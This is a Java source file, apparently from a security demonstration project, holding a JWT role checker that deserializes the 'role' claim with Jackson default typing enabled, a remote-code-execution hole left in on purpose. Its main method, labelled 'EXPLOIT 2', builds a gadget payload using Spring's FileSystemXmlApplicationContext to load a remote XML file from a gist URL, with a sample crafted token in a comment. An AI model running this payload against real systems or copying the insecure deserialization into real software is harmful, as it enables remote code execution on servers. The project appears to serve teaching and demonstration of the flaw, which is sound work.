package com.adioss.hack.utils;

import com.adioss.hack.Constants;
import com.adioss.hack.model.Role;
import com.auth0.jwk.Jwk;
import com.auth0.jwk.JwkException;
import com.auth0.jwk.JwkProvider;
import com.auth0.jwk.UrlJwkProvider;
import com.fasterxml.jackson.databind.ObjectMapper;
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jws;
import io.jsonwebtoken.Jwts;
import org.springframework.stereotype.Service;

import java.io.IOException;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;
import java.security.PublicKey;

@Service
public class JwtKeyManager {
    private static final ObjectMapper OBJECT_MAPPER = new ObjectMapper();

    static {
        OBJECT_MAPPER.enableDefaultTyping();
    }

    public Jws<Claims> checkSession(String jwtAsString) throws MalformedURLException, JwkException {
        JwkProvider provider = new UrlJwkProvider(new URL(Constants.DEFAULT_WEBAPP_URL + "/.well-known/jwks.json"));
        Jwk jwk = provider.get("1");
        System.out.println("Public key to use: '" + KeyTool.concertToString(jwk.getPublicKey()) + "'");
        System.out.println("JWT to parse: " + jwtAsString);
        PublicKey publicKey = jwk.getPublicKey();
        return Jwts.parser().setSigningKey(publicKey).parseClaimsJws(jwtAsString);
    }

    public void checkRoles(Jws<Claims> claimsJws) {
        try {
            String claimRole = (String) claimsJws.getBody().get("role");
            System.out.println(claimRole);
            Role role = OBJECT_MAPPER.readValue(claimRole, Role.class);
            if (!("COLLECT_MEME".equals(role.code) && role.grant.contains("W"))) {
                throw new RuntimeException("Not allowed!");
            }
        } catch (Exception e) {
            throw new RuntimeException(e.getMessage());
        }
    }

    /**
     * EXPLOIT 2 : RCE without based on JWT body deserialization
     */
    public static void main(String[] args) throws IOException {
        Role collectMeme = new Role();
        collectMeme.code = "COLLECT_MEME";
        collectMeme.grant = "R+W";
        try {
            InetAddress localHost = InetAddress.getLocalHost();
            collectMeme.source = new URL("http://" + localHost.getHostName());
        } catch (MalformedURLException | UnknownHostException e) {
            e.printStackTrace();
        }
        // encode
        String value = OBJECT_MAPPER.writeValueAsString(collectMeme);
        System.out.println("As json: " + value);
        // decode
        Role result = OBJECT_MAPPER.readValue(value, Role.class);
        System.out.println(result);

        // hack
        //// calc on windows
        // eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIwN2NkMzdiMS0zYzc3LTQzNTEtYjU1ZS0wMzRmYmRiNzBhYTgiLCJyb2xlIjoie1wiY29kZVwiOlwiQ09MTEVDVF9NRU1FXCIsXCJncmFudFwiOlwiUitXXCIsXCJzb3VyY2VcIjpbXCJqYXZhLm5ldC5VUkxcIixcImh0dHA6Ly8xOTIuMTY4LjIuNFwiXX0iLCJpc3MiOiJzZW5zaXRpdmUtd2ViYXBwIn0.CGjctcLwaeUaCgS86rqNWU7sDe1UIDAUVS3Y8vYGCRvJNPmLdAMWmtAqiaIPDtcrtkwFKjlFpBmJaZWoBLpwV-K4ddxEN7cXQzsJGzyGM_YifApFJWyemhS-p0hA2YiYo1hcuVMxKVbSiOL55QpM1UIBb9u7oizGDVKlm2BgFRXh6eHCXAZmwDQaIvxWGnNGvNbA-8rVmd7hEtXgoIsp3ttE7N0WMtNf9EeMwBoTO_7-Zx1n5iNIg9zIwkk4Kh9mSm5oZK5HtZcmjU05ZuqbAmn3eeT5h93shnzrZPKl7Tki4HYWq_2HkWHINmKkmCYqXslFgdAvxqz8kxgJ6vpJsg
        String payload = "[\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"https://gist.githubusercontent.com/adioss/425a3e777498775e496345ab227b9223/raw/05465282b81d98420c83c5d2bb8ec3aa326bd0b4/jackson-rce-via-spel-on-windows\"]";
        String hack = "{\"code\":\"COLLECT_MEME\",\"grant\":\"R+W\",\"source\":" + payload + "}";
        System.out.println(hack);
        // result = OBJECT_MAPPER.readValue(hack, Role.class);
        String header = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9";
        String body = "";
        System.out.println(result);
    }
}
